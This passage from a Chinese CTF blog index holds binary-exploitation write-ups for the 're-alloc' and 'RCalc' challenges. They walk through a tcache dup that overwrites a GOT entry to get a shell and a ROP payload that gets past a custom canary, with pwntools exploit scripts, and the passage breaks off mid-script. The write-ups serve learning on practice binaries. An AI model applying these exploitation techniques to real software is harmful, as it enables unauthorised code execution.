bin的时候需要绕过物理相邻堆块的inuse位检测，这对我来说理应是基础知识，但是不知道为什么我到今天才熟练掌握。虽然是道非常简单的题，主要简单在排堆的思路非常之清晰，但是能够做出来并拿到flag还是很开心。</p>\n","categories":["Binary_security"],"tags":["Tcache"]},{"title":"pwnable - re-alloc","url":"/2022/05/14/week11_6_pwnable_re-alloc/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>​    \n    <div id=\"aplayer-OmuWKNDK\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"1844479015\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div> </p>\n<h1><span id=\"overview\">overview</span></h1><p>​        上一道题不给我调试符号，我还能找到类似的版本用，这里直接不告诉我版本了，真牛。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-14%20%E4%B8%8B%E5%8D%882.44.17.png\" alt=\"截屏2022-05-14 下午2.44.17\"></p>\n<p>如果这样看不出具体版本的话，一般的方法一个是盲测，另外就是在ida中搜索gnu字符串，再或者</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">strings ./libc.so | grep <span class=\"string\">&quot;GNU C Library&quot;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-14%20%E4%B8%8B%E5%8D%883.02.01.png\" alt=\"截屏2022-05-14 下午3.02.01\"></p>\n<p>`</p>\n<p>​        这道题的保护也是只有pie没有开，但是got表是可以改的。</p>\n<p>​        2.29的libc目前来说比较重大的改变就是增加了tcache dup时的key检测，不过如果条件足够的话还是很好绕过。</p>\n<h1><span id=\"reverse\">reverse</span></h1><p>​        还是和tcache tear类似的结构。但是整个题目都是基于realloc实现的。</p>\n<h2><span id=\"alloc\">alloc</span></h2><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Index:&quot;</span>);</span><br><span class=\"line\">  idx = read_long();                            <span class=\"comment\">// read in a long int</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( idx &gt; <span class=\"number\">1</span> || heap[idx] )                   <span class=\"comment\">// idx &#x27;s  maximum is 1,which means we can allocate two chunk at most</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    LODWORD(v0) = <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Invalid !&quot;</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Size:&quot;</span>);</span><br><span class=\"line\">    size = read_long();</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( size &lt;= <span class=\"number\">0x78</span> )                         <span class=\"comment\">// we can&#x27;t allocate unsorted bin directly</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      ptr = <span class=\"built_in\">realloc</span>(<span class=\"number\">0LL</span>, size);                 <span class=\"comment\">// equal to malloc(size)</span></span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( ptr )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        heap[idx] = ptr;                        <span class=\"comment\">// store the ptr in head[idx]</span></span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Data:&quot;</span>);</span><br><span class=\"line\">        v0 = (_BYTE *)(heap[idx] + read_input(heap[idx], (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span>)size));<span class=\"comment\">// set the last character to 0</span></span><br><span class=\"line\">        *v0 = <span class=\"number\">0</span>;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">else</span></span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        LODWORD(v0) = <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;alloc error&quot;</span>);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      LODWORD(v0) = <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Too large!&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> (<span class=\"keyword\">int</span>)v0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2><span id=\"re-alloc\">re-alloc</span></h2><p>​        一个比较直观的realloc。</p>\n<h2><span id=\"re-free\">re-free</span></h2><p>​        类似，这里没有明显的uaf。</p>\n<h1><span id=\"利用\">利用</span></h1><p>​        逆完以后似乎没有发现明显可以利用的漏洞，并且程序是没有给我们提供show之类的函数的。由于我之前也咩有怎么做过realloc，所以不太熟悉，这里就动调一下。</p>\n<p>​        挺好玩的，这里的realloc给我感觉就是一个size比原来小的edit。</p>\n<p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-14%20%E4%B8%8B%E5%8D%888.37.01.png\" alt=\"截屏2022-05-14 下午8.37.01\"></p>\n<p>​        可以看到确实bk位新增了指向管理堆块的key，虽然我们只需要将它填成别的东西就可以double free，但是这里似乎不好填，我们只有一个realloc。</p>\n<p>​        还记得去年暑假第一次做这个题的时候（当时就是看了看），看到有篇文章说realloc本身就是危险的，比如这里，如果需要扩大内存，而没有足够的空间的话，原来的指针就并不会被置0，这样就会形成一个uaf。</p>\n<p>​        所以其实虽然我还是不清楚如何。利用realoc构造uaf，但是题目的思路应该就是改got进行一个leak，再改got从而getshell。</p>\n<p>​        看了wp。。但是这个题似乎咩有我之前想得那么复杂，其实在realloc的环节将size置于0会造成uaf这个漏洞我之前是有思考过也确实尝试了，但是当时给我直接一个alloc error报错让我以为此路不通，我当时还为信誓旦旦地认为realloc的size为0会返回空指针，就会触发下面alloc 的检测，所以肯定不行，就没有再深入下去了。。所以为什么wp可以呢？</p>\n<p>​        。。不知道，大概是我之前输入的有问题。总之这个题大概思路就是在这里。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">alloc(<span class=\"number\">0</span>,<span class=\"number\">0x18</span>,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x8</span>) <span class=\"comment\">#chunk1</span></span><br><span class=\"line\">realloc(<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"string\">&quot;&quot;</span>) <span class=\"comment\">#free chunk1 tcache =&gt;chunk1</span></span><br><span class=\"line\">realloc(<span class=\"number\">0</span>, <span class=\"number\">0x18</span>, p64(elf.got[<span class=\"string\">&quot;atoll&quot;</span>]))<span class=\"comment\">#对于tcache bin中的ptr进行realloc，并不会将ptr从tcache中取出，也就是一个edit功能。</span></span><br><span class=\"line\">gdb.attach(p)</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-14%20%E4%B8%8B%E5%8D%889.42.43.png\" alt=\"截屏2022-05-14 下午9.42.43\"></p>\n<p>​    </p>\n<p>​        这道题大致的思路就是利用两次tcache dup改atoll的got表，一次将其改为printf，构造格式化字符串leak libc，另外一次就直接改atoll为system 从而getshell。</p>\n<p>​        而具体tcache dup需要利用的就是realloc 0size造成的uaf，其中还需要注意排堆绕过2.29新增的key检测。</p>\n<p>​        其他没有什么特别的，我这里就主要研究一下排堆。</p>\n<p>​        其实到这里，我们已经将tcache的fd改为target addr了，但是这里还要绕过一个bk上的key，需要想办法把这个东西改成别的。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">alloc(<span class=\"number\">0</span>,<span class=\"number\">0x18</span>,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x8</span>) <span class=\"comment\">#chunk1</span></span><br><span class=\"line\">realloc(<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"string\">&quot;&quot;</span>) <span class=\"comment\">#free chunk1 tcache =&gt;chunk1</span></span><br><span class=\"line\">realloc(<span class=\"number\">0</span>, <span class=\"number\">0x18</span>, p64(elf.got[<span class=\"string\">&quot;atoll&quot;</span>]))<span class=\"comment\">#对于tcache bin中的ptr进行realloc，并不会将ptr从tcache中取出，也就是一个edit功能。</span></span><br></pre></td></tr></table></figure>\n<p>​        在这一步bin情况如下：</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-14%20%E4%B8%8B%E5%8D%8810.07.10.png\" alt=\"截屏2022-05-14 下午10.07.10\"></p>\n<p>​        只构造成这样其实是不好处理的，就算不考虑key，我们想要dup到atoll got，首先要把0x7ffff7fff260申请掉，这里chunk0 已经在bin中了，想要重新申请就必须先要free掉，这样就直接double free了，不太行。所以这里只能用chunk1来将它申请掉。</p>\n<p>​        这样bin中就只剩下一个atoll got了。但是heap处，由于我们刚刚申请的chunk1的内存地址是0x7ffff7fff260，正好覆盖了chunk0。</p>\n<p>​        所以内存中就变成了这样：</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-14%20%E4%B8%8B%E5%8D%8810.11.46.png\" alt=\"截屏2022-05-14 下午10.11.46\"></p>\n<p>​        现在我们想要再次申请到这个atoll got，也就是需要申请一个0x18大小的chunk，然而我们刚刚用掉了chunk1，chunk0也还在bin中，难以发挥作用，这样看来似乎陷入了死循环，但是破局之处正在于tcache的double free，只要我们想办法把chunk0的bk改掉，就可以double free了。            </p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-14%20%E4%B8%8B%E5%8D%8810.16.40.png\" alt=\"截屏2022-05-14 下午10.16.40\"></p>\n<p>关于这个地方，当我们把0x7ffff7fff260用chunk1申请掉，然后准备申请atoll got的时候，其实chunk1这里已经将bk覆盖为一个合法的值了，也就是说这里我们就已经能够成功将chunk0free了。</p>\n<p>​        但是如果就这样free的话，会变成这种情况：<img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-14%20%E4%B8%8B%E5%8D%8810.27.42.png\" alt=\"截屏2022-05-14 下午10.27.42\"></p>\n<p>​        也就是fd就会变成atoll got，tcache bin又变成<code>0x7ffff7fff260 —▸ 0x404048</code>了。原因很好理解，就是我们free了0x7ffff7fff260上的chunk0，所以被放入了tcache，那么如何让这个东西不被插入tcache呢？这个时候我们只要稍微调整一下chunk0的size，让它不正好插入到0x20的bin中就好了。</p>\n<p>​        </p>\n<p>​    先测试一下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">alloc(<span class=\"number\">0</span>,<span class=\"number\">0x18</span>,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x8</span>) <span class=\"comment\">#chunk1</span></span><br><span class=\"line\">realloc(<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"string\">&quot;&quot;</span>) <span class=\"comment\">#free chunk1 tcache =&gt;chunk1</span></span><br><span class=\"line\">realloc(<span class=\"number\">0</span>, <span class=\"number\">0x18</span>, p64(elf.got[<span class=\"string\">&quot;atoll&quot;</span>]))<span class=\"comment\">#对于tcache bin中的ptr进行realloc，并不会将ptr从tcache中取出，也就是一个edit功能。</span></span><br><span class=\"line\">alloc(<span class=\"number\">1</span>,<span class=\"number\">0x18</span>,<span class=\"string\">b&#x27;b&#x27;</span>*<span class=\"number\">0x8</span>) <span class=\"comment\">#chunk2</span></span><br><span class=\"line\">realloc(<span class=\"number\">0</span>,<span class=\"number\">0x28</span>,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x8</span>)</span><br><span class=\"line\">free(<span class=\"number\">0</span>)</span><br><span class=\"line\">alloc(<span class=\"number\">0</span>,<span class=\"number\">0x18</span>,p64(elf.plt[<span class=\"string\">&quot;printf&quot;</span>]))</span><br><span class=\"line\">gdb.attach(p)</span><br></pre></td></tr></table></figure>\n<p>可以看到确实这一步atoll got被改为了printf got。</p>\n<p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-14%20%E4%B8%8B%E5%8D%8810.06.03.png\" alt=\"截屏2022-05-14 下午10.06.03\"></p>\n<p>​        但是由于需要改两次，如果在这里就把got改了，后面就不好执行了，所以可以先利用相同的办法创建两个tcache dup。还需要注意的是我们不能破釜沉舟，我们还需要将chunk1也free掉，以保证第二次能够正常利用，也就是：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">alloc(<span class=\"number\">0</span>,<span class=\"number\">0x18</span>,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x8</span>) <span class=\"comment\">#chunk1</span></span><br><span class=\"line\">realloc(<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"string\">&quot;&quot;</span>) <span class=\"comment\">#free chunk1 tcache =&gt;chunk1</span></span><br><span class=\"line\">realloc(<span class=\"number\">0</span>, <span class=\"number\">0x18</span>, p64(elf.got[<span class=\"string\">&quot;atoll&quot;</span>]))<span class=\"comment\">#对于tcache bin中的ptr进行realloc，并不会将ptr从tcache中取出，也就是一个edit功能。</span></span><br><span class=\"line\">alloc(<span class=\"number\">1</span>,<span class=\"number\">0x18</span>,<span class=\"string\">b&#x27;b&#x27;</span>*<span class=\"number\">0x8</span>) <span class=\"comment\">#chunk2</span></span><br><span class=\"line\"></span><br><span class=\"line\">realloc(<span class=\"number\">0</span>,<span class=\"number\">0x28</span>,<span class=\"string\">b&#x27;d&#x27;</span>)</span><br><span class=\"line\">free(<span class=\"number\">0</span>)</span><br><span class=\"line\">realloc(<span class=\"number\">1</span>, <span class=\"number\">0x28</span>, <span class=\"string\">b&quot;d&quot;</span>*<span class=\"number\">0x10</span>)</span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br></pre></td></tr></table></figure>\n<p>​        这样换一下size再重复一次，就构造出了两个tcahce的dup，然后我们先把第一个atoll改为printf。</p>\n<p>​        然后直接利用格式化字符串leak libc。</p>\n<p>​        leak之后直接再利用第二个atoll将got改为system。这里的利用就比较套路化，没有什么值得研究的了，就是需要注意在最后一次申请的时候是利用printf的返回值作为长度。</p>\n<p>​        pwnable的环境好恶心啊。</p>\n<p>​        </p>\n<p>​</p>\n","categories":["Binary_security"],"tags":["Tcache"]},{"title":"攻防世界 - RCalc","url":"/2022/05/15/week11_7.1_%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_RCalc/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>​    \n    <div id=\"aplayer-ZMVkTDhk\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"1844479015\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div> </p>\n<h1><span id=\"overview\">overview</span></h1><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-15%20%E4%B8%8A%E5%8D%889.20.54.png\" alt=\"截屏2022-05-15 上午9.20.54\"></p>\n<p>​        …栈溢出？</p>\n<h1><span id=\"reverse\">reverse</span></h1><p>​        这个逻辑应该不是非常好逆。</p>\n<h2><span id=\"buf_init\">buf_init</span></h2><p>​        首先是一个初始化随机数相关内存空间的一个函数。在bss段上malloc了两个0x10大小的chunk,其中位于高地址的 chunk1 + 8，也就是<code>0x6020F8 + 8</code>地方保存了另外一个0x100 size chunk的指针，而位于chunk0，也就是<code>0x6020F0</code> 的这个chunk ，<code>0x6020F0+8</code>  的位置（其实就是chunk1）的位置又保存了一个size为320的chunk的指针。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">random_chunk1 = <span class=\"built_in\">malloc</span>(<span class=\"number\">0x10</span>uLL);</span><br><span class=\"line\"><span class=\"keyword\">if</span> ( !random_chunk1 )</span><br><span class=\"line\">  <span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">random_chunk0 = <span class=\"built_in\">malloc</span>(<span class=\"number\">0x10</span>uLL);</span><br><span class=\"line\"><span class=\"keyword\">if</span> ( !random_chunk0 )</span><br><span class=\"line\">  <span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">*random_chunk1 = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">v0 = random_chunk1;</span><br><span class=\"line\">*(v0 + <span class=\"number\">8</span>) = <span class=\"built_in\">malloc</span>(<span class=\"number\">0x100</span>uLL);</span><br><span class=\"line\">*random_chunk0 = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">v1 = random_chunk0;</span><br><span class=\"line\">result = <span class=\"built_in\">malloc</span>(<span class=\"number\">0x320</span>uLL);</span><br><span class=\"line\">*(v1 + <span class=\"number\">8</span>) = result;</span><br><span class=\"line\"><span class=\"keyword\">return</span> result;</span><br></pre></td></tr></table></figure>\n<h2><span id=\"run\">run</span></h2><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">v2 = Random_Number_Generator();</span><br><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Input your name pls: &quot;</span>);</span><br><span class=\"line\">__isoc99_scanf(<span class=\"string\">&quot;%s&quot;</span>, name);</span><br><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Hello %s!\\nWelcome to RCTF 2017!!!\\n&quot;</span>, name);</span><br><span class=\"line\"><span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Let&#x27;s try our smart calculator&quot;</span>);</span><br><span class=\"line\">caculate();</span><br><span class=\"line\">result = sub_400B92();</span><br><span class=\"line\"><span class=\"keyword\">if</span> ( result != v2 )</span><br><span class=\"line\">  <span class=\"keyword\">default</span>();</span><br><span class=\"line\"><span class=\"keyword\">return</span> result;</span><br></pre></td></tr></table></figure>\n<p>​        整体逻辑的实现，比较简单，重点在计算的过程。这里的name输入理应没有溢出，估计是拿来leak的。</p>\n<p>​        然后首先还生成了随机数，跟进去看一看随机数的生成过程。</p>\n<h2><span id=\"random_number_generator\">Random_Number_Generator()</span></h2><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> ( *random_chunk0 )                         <span class=\"comment\">// if thread have not generated the random number,the value is 0,so the procedure will be skipped</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  ptr = *(*(random_chunk0 + <span class=\"number\">8</span>) + <span class=\"number\">8LL</span> * *random_chunk0 - <span class=\"number\">8</span>);<span class=\"comment\">// *(*chunk3 + 8 x *chunk0 - 8)</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  stream = fopen(<span class=\"string\">&quot;/dev/urandom&quot;</span>, <span class=\"string\">&quot;r&quot;</span>);        <span class=\"comment\">// generate a random number and read it in ptr</span></span><br><span class=\"line\">  fread(&amp;ptr, <span class=\"number\">1uLL</span>, <span class=\"number\">4uLL</span>, stream);</span><br><span class=\"line\">  fclose(stream);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">srand(ptr);</span><br><span class=\"line\">random = rand();</span><br><span class=\"line\">v0 = random &lt;&lt; <span class=\"number\">32</span>;                            <span class=\"comment\">// random / 2^31, taking the right 32 bits</span></span><br><span class=\"line\">random = v0 | rand();                         <span class=\"comment\">// bit or operation, means for what? </span></span><br><span class=\"line\">v1 = *(random_chunk0 + <span class=\"number\">8</span>);                    <span class=\"comment\">// reserve in chunk1 </span></span><br><span class=\"line\">v2 = (*random_chunk0)++;                      <span class=\"comment\">// Maybe likes a idx to control </span></span><br><span class=\"line\">*(v1 + <span class=\"number\">8</span> * v2) = random;                      <span class=\"comment\">// I have no ideal on it</span></span><br><span class=\"line\"><span class=\"keyword\">return</span> random;</span><br></pre></td></tr></table></figure>\n<h2><span id=\"save-result\">save result</span></h2><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">v1 = *(random_chunk1 + <span class=\"number\">8</span>);                    <span class=\"comment\">// chunk1 &#x27;s value,point to chunk3(0x100)</span></span><br><span class=\"line\">v2 = (*random_chunk1)++;</span><br><span class=\"line\">result = a1;</span><br><span class=\"line\">*(v1 + <span class=\"number\">8</span> * v2) = a1;                          <span class=\"comment\">// reserve result in chunk1 + (? + 8) x 8</span></span><br><span class=\"line\"><span class=\"keyword\">return</span> result;</span><br></pre></td></tr></table></figure>\n<p>​        这里其实我没有太理解这个保存的地方，在我看来这个<code>*(v1 + 8 * v2) = a1;</code>中的v2是0x100chunk的指针，8乘以一个指针未免太可怕了。动调看一看。</p>\n<p>​        大概长这样：</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-15%20%E4%B8%8A%E5%8D%8810.59.27.png\" alt=\"截屏2022-05-15 上午10.59.27\">        </p>\n<p>整理出来就是</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-15%20%E4%B8%8A%E5%8D%8810.59.46.png\" alt=\"截屏2022-05-15 上午10.59.46\"></p>\n<p>这个0x320的chunk储存的就是生成的随机数。</p>\n<p>​        所以这里</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">v2 = (*random_chunk0)++;                   </span><br><span class=\"line\">  *(v1 + <span class=\"number\">8</span> * v2) = random;</span><br></pre></td></tr></table></figure>\n<p>​        对应的v2就是这个自增的1,然后这里把随机数储存在<code>0x6033b0</code>。这样就比较清楚了。</p>\n<p>​        同理，这个对于结果的检测的逻辑也就很清晰:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">return</span> *(*(random_chunk0 + <span class=\"number\">8</span>) + <span class=\"number\">8LL</span> * (*random_chunk0)-- - <span class=\"number\">8</span>);</span><br></pre></td></tr></table></figure>\n<p>​        也就是<code>0x603260 + （3*8-8） = 0x603288 =&gt; 0x6033b0</code>的地方要是随机数，以防止我们修改什么的。</p>\n<p>​        </p>\n<p>​        </p>\n<h1><span id=\"利用\">利用</span></h1><p>​    开始没有目的地随机尝试（美其名曰手工fuzz），发现一个说大不大说小不小的漏洞，就是由于题目似乎是没有限制计算次数，所以计算保存的结果是可以覆盖这个chunk的，但是题目是对于这个chunk保存的随机数作了检测的，类似一个canary，所以我们并不能随意覆盖。</p>\n<p>​                <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-15%20%E4%B8%8A%E5%8D%8811.29.09.png\" alt=\"截屏2022-05-15 上午11.29.09\"></p>\n<p>​        当然由于检测在这个函数返回之前进行，所以如果我们不返回的话还是可以肆无忌惮地溢出的，但是溢出的意义何在呢？随机数大概不能修改，而这里只有一个chunk size还有一些修改的意义，但是不能free，意义也不大。</p>\n<p>​        哦，这里name是可以溢出的，但是。。为什么这些题明明checksec检测没有canary但是实际还是有啊</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-15%20%E4%B8%8A%E5%8D%8811.50.43.png\" alt=\"截屏2022-05-15 上午11.50.43\"></p>\n<p>​        还是有canary。而且这里比较阴间，如果想要leak canary 就必须绕过空字节，但是截断输入必须要空字节。</p>\n<p>​        这个题现在是三个问题，一个是name的溢出由于canary不好控制，第二是结果保存的堆溢出由于随机数的检测无法返回，第三就是堆溢出不知道如何利用。我觉得思路应该是利用计算的漏洞，堆溢出也好，其他我没有看到的漏洞点也好，去leak一些东西，然而这样我们就没有办法重新利用name的栈溢出了。这个name的溢出只能在刚刚执行程序的时候利用，而且感觉由于这个空字节的存在，很难进行什么leak。。</p>\n<p>​        ps：稍微测试了一下，关于那个checksec的canary保护问题 ，canary其实是有三种模式，<code>-fno-stack-protector</code>就是完全关闭，<code>-fstack-protector</code>只保护局部变量中含有char数组的函数，<code>-fstack-protector-all</code>就是为所有代码添加canary。而经过测试，只有最后一种模式会使得checksec检测出canary。</p>\n<p>​        看了wp，大彻大悟了。刚刚说checksec没有检测出canary，不是因为部分保护，而是因为确实就是没有加入自带的caanry，而是程序手工实现了一个canary，而name溢出的canary就来自于我们生成的随机数，所以只要我们先随意rop，然后进入计算模块，将canary覆盖为我们自己定义的数值，这时候如果再返回，其实canary就已经被改变了，那么就相当于绕过了canary。确实比较巧妙，也其实很简单，只是我一直没有意识到这个栈上的canary其实就是堆上的canary，如果意识到了的话我应该是能独立完成的。绕过caanry的地方其实之前已经很清楚了，所以下面就略略地过一下了。</p>\n<p>栈name的canary</p>\n<p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-15%20%E4%B8%8B%E5%8D%881.26.27.png\" alt=\"截屏2022-05-15 下午1.26.27\"></p>\n<p>堆的canary</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-15%20%E4%B8%8B%E5%8D%881.26.56.png\" alt=\"截屏2022-05-15 下午1.26.56\">                </p>\n<p>可以看到高位完全一致。所以在这里全部覆盖为0的话，下一次retn的时候栈上的canary就被绕过了。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\"></span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>,<span class=\"string\">&#x27;splitw&#x27;</span>,<span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\">context.log_level = <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\">p = process(<span class=\"string\">&#x27;./RCalc&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">#p = remote(&quot;chall.pwnable.tw&quot;,10106)</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./RCalc&#x27;</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">&#x27;./libc.so.6&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">rdi_ret = <span class=\"number\">0x401123</span></span><br><span class=\"line\">printf_plt = elf.plt[<span class=\"string\">&#x27;printf&#x27;</span>]  </span><br><span class=\"line\">main_addr = <span class=\"number\">0x401036</span></span><br><span class=\"line\">__libc_start_main_ = <span class=\"number\">0x601FF0</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">begin</span>(<span class=\"params\">name</span>):</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;Input your name pls: &quot;</span>)</span><br><span class=\"line\">\tp.sendline(name)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;Let&#x27;s try our smart calculator&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add</span>():</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;Your choice:&quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&quot;1&quot;</span>)\t</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;input 2 integer: &quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&quot;0&quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&quot;0&quot;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;The result is&quot;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;Save the result? &quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&quot;yes&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#rop</span></span><br><span class=\"line\">payload = <span class=\"string\">b&quot;\\x00&quot;</span>*<span class=\"number\">0x110</span></span><br><span class=\"line\">payload += p64(<span class=\"number\">0</span>)</span><br><span class=\"line\">payload += p64(rdi_ret)</span><br><span class=\"line\">payload += p64(__libc_start_main_)</span><br><span class=\"line\">payload += p64(printf_plt)</span><br><span class=\"line\">payload += p64(main_addr)</span><br><span class=\"line\"><span class=\"comment\">#payload += b&#x27;\\n&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">begin(payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">35</span>):</span><br><span class=\"line\">\tadd()</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Your choice:&quot;</span>)</span><br><span class=\"line\">p.sendline(<span 